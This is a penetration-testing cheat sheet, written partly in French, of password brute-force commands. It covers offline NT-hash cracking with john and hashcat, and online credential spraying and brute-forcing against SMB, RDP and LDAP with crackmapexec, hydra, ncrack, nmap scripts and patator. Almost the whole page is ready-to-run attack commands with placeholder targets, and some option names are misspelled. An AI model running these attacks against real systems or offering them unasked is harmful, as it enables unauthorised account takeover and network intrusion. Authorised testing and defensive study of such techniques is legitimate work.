# Brute-force

## Offline

```bash
Brute force :
john --format=NT hashNT.txt
hashcat -m 1000 -a 3 hashNT.txt

Dictionnaire :
john --format=NT hashNT.txt --worlist=dictionnary.txt  --rules=korelogic
john --format=NT hashNT.txt --worlist=dictionnary.txt --rules=insidepro
hashcat -m 1000 -a 0 hashNT.txt dictionnary.txt -r rules/best64.rule
 
```

## TCP 445 (SMB)

```bash
crackmapexec smb target.txt -u user1 user2 -p password 
crackmapexec smb target.txt -u user -p password1 password2
crackmapexec smb target.txt -u user.txt -p password1
crackmapexec smb target.txt -u user -p password.txt 

# 1 user = 1 password
crackmapexec smb <target> -u user.txt -p password.txt --no-bruteforce --continue-on-succes

# cluster bomb
crackmapexec smb target.txt -u user.txt -p password.txt --continue-on-succes

nmap --script smb-brute -p 445 <target>
hydra -l <user> -P pass.txt <target> smb -t 1
```

## TCP 3389 (RDP)

```bash
ncrack -vv --user <user> -P pass.txt rdp://<target>
hydra -V -f -L user.txt -P pass.txt rdp://<target>
```

---

## TCP 389/636 (LDAP(S))

```bash
python patator.py ldap_login host=<target> binddn='CN=FILE0,dc=<domain>,dc=<fqdn>' bindpw=FILE1 0=user.txt 1=pass.txt

nmap --script ldap-brute -p 389 <target>

```

